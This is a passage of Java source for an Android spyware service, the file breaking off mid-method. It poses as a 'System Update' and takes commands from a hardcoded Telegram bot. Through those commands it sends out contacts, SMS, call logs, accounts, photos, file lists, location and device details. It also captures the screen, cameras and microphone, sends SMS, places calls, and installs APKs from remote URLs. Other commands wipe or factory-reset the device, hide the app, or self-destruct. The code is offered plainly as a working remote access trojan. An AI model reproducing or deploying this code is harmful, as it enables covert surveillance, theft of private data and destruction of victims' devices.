package com.system.security;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.webkit.MimeTypeMap;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CommandService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    
    private OkHttpClient client = new OkHttpClient();
    private Timer timer;
    private int lastUpdateId = 0;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder mediaRecorder;
    private Camera camera;
    private boolean isRecordingAudio = false;
    private boolean isRecordingVideo = false;
    private String currentAudioPath;
    private String currentVideoPath;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "System:WakeLock");
        wakeLock.acquire(60*60*1000L);
        
        startForegroundService();
        
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkBotCommands();
            }
        }, 0, 3000);
        
        // إرسال معلومات الجهاز عند بدء الخدمة
        sendDeviceInfo();
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(101, createNotification());
        }
    }

    private Notification createNotification() {
        String channelId = "system_channel";
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId, "System Update", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("System services");
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }

        return new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update")
                .setContentText("Installing security updates...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            
            // معلومات الجهاز الأساسية
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("brand", Build.BRAND);
            info.put("device", Build.DEVICE);
            info.put("product", Build.PRODUCT);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("serial", Build.getSerial());
            
            // معلومات الاتصال
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone_number", tm.getLine1Number());
                info.put("network_operator", tm.getNetworkOperatorName());
                info.put("sim_operator", tm.getSimOperatorName());
                info.put("country", tm.getNetworkCountryIso());
            }
            
            // معلومات البطارية
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            info.put("battery_level", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
            
            // معلومات التخزين
            StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
            long bytesAvailable = (long) stat.getBlockSize() * (long) stat.getBlockCount();
            info.put("storage_total", bytesAvailable / (1024 * 1024 * 1024) + " GB");
            
            // معلومات التطبيقات المثبتة
            PackageManager pm = getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);
            JSONArray apps = new JSONArray();
            for (PackageInfo pkg : packages) {
                apps.put(pkg.packageName);
            }
            info.put("installed_apps", apps);
            
            // إرسال المعلومات
            File file = new File(getCacheDir(), "device_info.json");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(info.toString(2).getBytes());
            fos.close();
            
            sendFileToTelegram(file, "device_info.json");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void checkBotCommands() {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId + "&timeout=10")
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onResponse(Call c, Response r) throws IOException {
                try {
                    String body = r.body().string();
                    JSONObject json = new JSONObject(body);
                    JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id") + 1;
                        
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                long chatId = message.getJSONObject("chat").getLong("id");
                                
                                sendToTelegram("📩 تم استلام: " + text, String.valueOf(chatId));
                                
                                switch (text) {
                                    // أوامر المعلومات
                                    case "/info":
                                        sendDeviceInfo();
                                        break;
                                        
                                    case "/location":
                                        getLocation();
                                        break;
                                        
                                    case "/contacts":
                                        getContacts();
                                        break;
                                        
                                    case "/sms":
                                        getSms();
                                        break;
                                        
                                    case "/calls":
                                        getCallLog();
                                        break;
                                        
                                    case "/accounts":
                                        getAccounts();
                                        break;
                                        
                                    case "/photos":
                                        getPhotos();
                                        break;
                                        
                                    case "/videos":
                                        getVideos();
                                        break;
                                        
                                    case "/files":
                                        getFiles();
                                        break;
                                        
                                    // أوامر التحكم
                                    case "/screenshot":
                                        takeScreenshot();
                                        break;
                                        
                                    case "/front_camera":
                                        takeFrontCameraPhoto();
                                        break;
                                        
                                    case "/back_camera":
                                        takeBackCameraPhoto();
                                        break;
                                        
                                    case "/record_audio_start":
                                        startAudioRecording();
                                        break;
                                        
                                    case "/record_audio_stop":
                                        stopAudioRecording();
                                        break;
                                        
                                    case "/record_video_start":
                                        startVideoRecording();
                                        break;
                                        
                                    case "/record_video_stop":
                                        stopVideoRecording();
                                        break;
                                        
                                    case "/lock":
                                        lockDevice();
                                        break;
                                        
                                    case "/unlock":
                                        unlockDevice();
                                        break;
                                        
                                    case "/screen_on":
                                        screenOn();
                                        break;
                                        
                                    case "/screen_off":
                                        screenOff();
                                        break;
                                        
                                    case "/vibrate":
                                        vibrate();
                                        break;
                                        
                                    case "/ring":
                                        ring();
                                        break;
                                        
                                    case "/silent":
                                        silent();
                                        break;
                                        
                                    case "/volume_up":
                                        volumeUp();
                                        break;
                                        
                                    case "/volume_down":
                                        volumeDown();
                                        break;
                                        
                                    case "/open_url":
                                        sendToTelegram("❌ استخدم: /open_url [الرابط]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/send_sms":
                                        sendToTelegram("❌ استخدم: /send_sms [رقم] [نص]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/make_call":
                                        sendToTelegram("❌ استخدم: /make_call [رقم]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/install_app":
                                        sendToTelegram("❌ استخدم: /install_app [رابط]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/uninstall_app":
                                        sendToTelegram("❌ استخدم: /uninstall_app [package]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/delete_file":
                                        sendToTelegram("❌ استخدم: /delete_file [المسار]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/wipe_data":
                                        wipeData();
                                        break;
                                        
                                    case "/factory_reset":
                                        factoryReset();
                                        break;
                                        
                                    case "/lock_app":
                                        sendToTelegram("❌ استخدم: /lock_app [package]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/unlock_app":
                                        sendToTelegram("❌ استخدم: /unlock_app [package]", String.valueOf(chatId));
                                        break;
                                        
                                    case "/hide_app":
                                        hideApp();
                                        break;
                                        
                                    case "/unhide_app":
                                        unhideApp();
                                        break;
                                        
                                    case "/self_destruct":
                                        selfDestruct();
                                        break;
                                        
                                    case "/help":
                                        sendHelp(String.valueOf(chatId));
                                        break;
                                        
                                    default:
                                        if (text.startsWith("/open_url ")) {
                                            String url = text.substring(10);
                                            openUrl(url);
                                        } else if (text.startsWith("/send_sms ")) {
                                            String[] parts = text.substring(10).split(" ", 2);
                                            if (parts.length == 2) {
                                                sendSms(parts[0], parts[1]);
                                            }
                                        } else if (text.startsWith("/make_call ")) {
                                            String number = text.substring(11);
                                            makeCall(number);
                                        } else if (text.startsWith("/install_app ")) {
                                            String url = text.substring(13);
                                            installApp(url);
                                        } else if (text.startsWith("/uninstall_app ")) {
                                            String pkg = text.substring(15);
                                            uninstallApp(pkg);
                                        } else if (text.startsWith("/delete_file ")) {
                                            String path = text.substring(13);
                                            deleteFile(path);
                                        } else if (text.startsWith("/lock_app ")) {
                                            String pkg = text.substring(10);
                                            lockApp(pkg);
                                        } else if (text.startsWith("/unlock_app ")) {
                                            String pkg = text.substring(12);
                                            unlockApp(pkg);
                                        }
                                        break;
                                }
                            }
                        }
                    }
                    r.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            
            @Override
            public void onFailure(Call c, IOException e) {}
        });
    }

    private void sendHelp(String chatId) {
        String help = "📋 **قائمة الأوامر الكاملة**\n\n" +
                "**معلومات الجهاز:**\n" +
                "/info - معلومات الجهاز الكاملة\n" +
                "/location - الموقع الحالي\n" +
                "/contacts - جهات الاتصال\n" +
                "/sms - جميع الرسائل\n" +
                "/calls - سجل المكالمات\n" +
                "/accounts - الحسابات المسجلة\n" +
                "/photos - الصور\n" +
                "/videos - الفيديوهات\n" +
                "/files - جميع الملفات\n\n" +
                
                "**الكاميرا والتسجيل:**\n" +
                "/screenshot - تصوير الشاشة\n" +
                "/front_camera - صورة من الكاميرا الأمامية\n" +
                "/back_camera - صورة من الكاميرا الخلفية\n" +
                "/record_audio_start - بدء تسجيل الصوت\n" +
                "/record_audio_stop - إيقاف التسجيل\n" +
                "/record_video_start - بدء تسجيل فيديو\n" +
                "/record_video_stop - إيقاف التسجيل\n\n" +
                
                "**التحكم بالجهاز:**\n" +
                "/lock - قفل الشاشة\n" +
                "/unlock - فتح الشاشة\n" +
                "/screen_on - تشغيل الشاشة\n" +
                "/screen_off - إطفاء الشاشة\n" +
                "/vibrate - اهتزاز\n" +
                "/ring - رنين\n" +
                "/silent - وضع صامت\n" +
                "/volume_up - رفع الصوت\n" +
                "/volume_down - خفض الصوت\n\n" +
                
                "**أوامر متقدمة:**\n" +
                "/open_url [رابط] - فتح رابط\n" +
                "/send_sms [رقم] [نص] - إرسال رسالة\n" +
                "/make_call [رقم] - اتصال\n" +
                "/install_app [رابط] - تثبيت تطبيق\n" +
                "/uninstall_app [package] - حذف تطبيق\n" +
                "/delete_file [مسار] - حذف ملف\n" +
                "/wipe_data - مسح بيانات المستخدم\n" +
                "/factory_reset - إعادة ضبط المصنع\n" +
                "/lock_app [package] - قفل تطبيق\n" +
                "/unlock_app [package] - فتح تطبيق\n" +
                "/hide_app - إخفاء التطبيق\n" +
                "/unhide_app - إظهار التطبيق\n" +
                "/self_destruct - التدمير الذاتي";
        
        sendToTelegram(help, chatId);
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ لا توجد صلاحية موقع", CHAT_ID);
                return;
            }
            
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                String mapLink = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendToTelegram("📍 الموقع:\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + "\n" + mapLink, CHAT_ID);
            } else {
                sendToTelegram("❌ لا يمكن الحصول على الموقع", CHAT_ID);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
                
                JSONArray contacts = new JSONArray();
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    contact.put("number", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    contacts.put(contact);
                }
                if (cursor != null) cursor.close();
                
                File file = new File(getCacheDir(), "contacts.json");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(contacts.toString(2).getBytes());
                fos.close();
                
                sendFileToTelegram(file, "contacts.json");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void getSms() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية لقراءة الرسائل", CHAT_ID);
                    return;
                }
                
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 100");
                
                JSONArray smsList = new JSONArray();
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndex("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndex("body")));
                    sms.put("date", new Date(cursor.getLong(cursor.getColumnIndex("date"))).toString());
                    smsList.put(sms);
                }
                if (cursor != null) cursor.close();
                
                File file = new File(getCacheDir(), "sms.json");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(smsList.toString(2).getBytes());
                fos.close();
                
                sendFileToTelegram(file, "sms.json");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ لا توجد صلاحية لقراءة سجل المكالمات", CHAT_ID);
                    return;
                }
                
                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 100");
                
                JSONArray calls = new JSONArray();
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndex("number")));
                    call.put("name", cursor.getString(cursor.getColumnIndex("name")));
                    call.put("type", cursor.getString(cursor.getColumnIndex("type")));
                    call.put("duration", cursor.getString(cursor.getColumnIndex("duration")));
                    call.put("date", new Date(cursor.getLong(cursor.getColumnIndex("date"))).toString());
                    calls.put(call);
                }
                if (cursor != null) cursor.close();
                
                File file = new File(getCacheDir(), "calls.json");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(calls.toString(2).getBytes());
                fos.close();
                
                sendFileToTelegram(file, "calls.json");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void getAccounts() {
        new Thread(() -> {
            try {
                AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
                Account[] accounts = am.getAccounts();
                
                JSONArray accountList = new JSONArray();
                for (Account account : accounts) {
                    JSONObject acc = new JSONObject();
                    acc.put("type", account.type);
                    acc.put("name", account.name);
                    accountList.put(acc);
                }
                
                File file = new File(getCacheDir(), "accounts.json");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(accountList.toString(2).getBytes());
                fos.close();
                
                sendFileToTelegram(file, "accounts.json");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void getPhotos() {
        new Thread(() -> {
            try {
                String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA};
                Cursor cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null, "date_added DESC LIMIT 50");
                
                File photosDir = new File(getCacheDir(), "photos");
                if (!photosDir.exists()) photosDir.mkdirs();
                
                List<File> photoFiles = new ArrayList<>();
                int count = 0;
                
                while (cursor != null && cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    File src = new File(path);
                    if (src.exists()) {
                        File dest = new File(photosDir, "photo_" + count + ".jpg");
                        copyFile(src, dest);
                        photoFiles.add(dest);
                        count++;
                    }
                }
                if (cursor != null) cursor.close();
                
                if (count == 0) {
                    sendToTelegram("🖼 لا توجد صور", CHAT_ID);
                    return;
                }
                
                File zipFile = new File(getCacheDir(), "photos.zip");
                zipFiles(photoFiles, zipFile);
                sendFileToTelegram(zipFile, "photos.zip");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void getVideos() {
        new Thread(() -> {
            try {
                String[] projection = {MediaStore.Video.Media._ID, MediaStore.Video.Media.DATA};
                Cursor cursor = getContentResolver().query(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    projection, null, null, "date_added DESC LIMIT 20");
                
                JSONArray videos = new JSONArray();
                while (cursor != null && cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                    videos.put(path);
                }
                if (cursor != null) cursor.close();
                
                File file = new File(getCacheDir(), "videos.json");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(videos.toString(2).getBytes());
                fos.close();
                
                sendFileToTelegram(file, "videos.json");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void getFiles() {
        new Thread(() -> {
            try {
                JSONArray files = new JSONArray();
                File storage = Environment.getExternalStorageDirectory();
                listFiles(storage, files, 0);
                
                File file = new File(getCacheDir(), "files.json");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(files.toString(2).getBytes());
                fos.close();
                
                sendFileToTelegram(file, "files.json");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void listFiles(File dir, JSONArray files, int depth) {
        if (depth > 3) return;
        File[] list = dir.listFiles();
        if (list != null) {
            for (File f : list) {
                if (f.isDirectory()) {
                    listFiles(f, files, depth + 1);
                } else {
                    files.put(f.getAbsolutePath());
                }
            }
        }
    }

    private void takeScreenshot() {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("TAKE_SCREENSHOT");
            startService(intent);
            sendToTelegram("📸 جاري التقاط الشاشة", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void takeFrontCameraPhoto() {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("TAKE_FRONT_PHOTO");
            startService(intent);
            sendToTelegram("📸 جاري التقاط صورة أمامية", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void takeBackCameraPhoto() {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("TAKE_BACK_PHOTO");
            startService(intent);
            sendToTelegram("📸 جاري التقاط صورة خلفية", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startAudioRecording() {
        try {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ لا توجد صلاحية تسجيل الصوت", CHAT_ID);
                return;
            }
            
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            if (!audioDir.exists()) audioDir.mkdirs();
            
            currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecordingAudio = true;
            
            sendToTelegram("🎤 بدأ تسجيل الصوت", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopAudioRecording() {
        try {
            if (mediaRecorder != null && isRecordingAudio) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecordingAudio = false;
                
                File file = new File(currentAudioPath);
                sendAudioToTelegram(file);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startVideoRecording() {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("START_VIDEO_RECORDING");
            startService(intent);
            sendToTelegram("🎥 بدأ تسجيل الفيديو", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopVideoRecording() {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("STOP_VIDEO_RECORDING");
            startService(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void lockDevice() {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("LOCK_DEVICE");
            startService(intent);
            sendToTelegram("🔒 جاري قفل الجهاز", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unlockDevice() {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("UNLOCK_DEVICE");
            startService(intent);
            sendToTelegram("🔓 جاري فتح الجهاز", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void screenOn() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "System:WakeLock");
                wl.acquire(5000);
                wl.release();
            }
            sendToTelegram("💡 تم تشغيل الشاشة", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void screenOff() {
        try {
            DevicePolicyManager pm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            if (pm.isAdminActive(admin)) {
                pm.lockNow();
            }
            sendToTelegram("📱 تم إطفاء الشاشة", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void vibrate() {
        try {
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createOneShot(3000, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(3000);
            }
            sendToTelegram("📳 تم الاهتزاز", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void ring() {
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            am.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
            
            Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            MediaPlayer player = MediaPlayer.create(this, notification);
            player.setLooping(true);
            player.start();
            
            handler.postDelayed(() -> {
                if (player.isPlaying()) {
                    player.stop();
                    player.release();
                }
            }, 10000);
            
            sendToTelegram("🔔 تم تشغيل الرنين", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void silent() {
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
            sendToTelegram("🔇 تم تفعيل الوضع الصامت", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void volumeUp() {
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, 0);
            sendToTelegram("🔊 تم رفع الصوت", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void volumeDown() {
        try {
            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
            am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, 0);
            sendToTelegram("🔉 تم خفض الصوت", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("🔗 تم فتح: " + url, CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendSms(String number, String message) {
        try {
            if (checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ لا توجد صلاحية إرسال رسائل", CHAT_ID);
                return;
            }
            
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, message, null, null);
            sendToTelegram("📨 تم إرسال الرسالة إلى " + number, CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void makeCall(String number) {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("📞 جاري الاتصال بـ " + number, CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void installApp(String url) {
        new Thread(() -> {
            try {
                sendToTelegram("📥 جاري تحميل التطبيق...", CHAT_ID);
                
                URL downloadUrl = new URL(url);
                URLConnection connection = downloadUrl.openConnection();
                connection.connect();
                
                String fileName = url.substring(url.lastIndexOf("/") + 1);
                File file = new File(getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), fileName);
                
                InputStream input = connection.getInputStream();
                FileOutputStream output = new FileOutputStream(file);
                
                byte[] buffer = new byte[4096];
                int count;
                while ((count = input.read(buffer)) != -1) {
                    output.write(buffer, 0, count);
                }
                output.flush();
                output.close();
                input.close();
                
                sendToTelegram("✅ تم التحميل، جاري التثبيت...", CHAT_ID);
                
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                
            } catch (Exception e) {
                e.printStackTrace();
                sendToTelegram("❌ فشل التثبيت: " + e.getMessage(), CHAT_ID);
            }
        }).start();
    }

    private void uninstallApp(String packageName) {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("🗑 جاري حذف: " + packageName, CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void deleteFile(String path) {
        try {
            File file = new File(path);
            if (file.exists()) {
                file.delete();
                sendToTelegram("🗑 تم حذف: " + path, CHAT_ID);
            } else {
                sendToTelegram("❌ الملف غير موجود", CHAT_ID);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void wipeData() {
        try {
            DevicePolicyManager pm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            if (pm.isAdminActive(admin)) {
                pm.wipeData(0);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void factoryReset() {
        try {
            DevicePolicyManager pm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, AdminReceiver.class);
            if (pm.isAdminActive(admin)) {
                pm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void lockApp(String packageName) {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("LOCK_APP");
            intent.putExtra("package", packageName);
            startService(intent);
            sendToTelegram("🔒 تم قفل التطبيق: " + packageName, CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unlockApp(String packageName) {
        try {
            Intent intent = new Intent(this, ControlService.class);
            intent.setAction("UNLOCK_APP");
            intent.putExtra("package", packageName);
            startService(intent);
            sendToTelegram("🔓 تم فتح التطبيق: " + packageName, CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void hideApp() {
        try {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            sendToTelegram("👻 تم إخفاء التطبيق", CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void unhideApp() {
        try {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
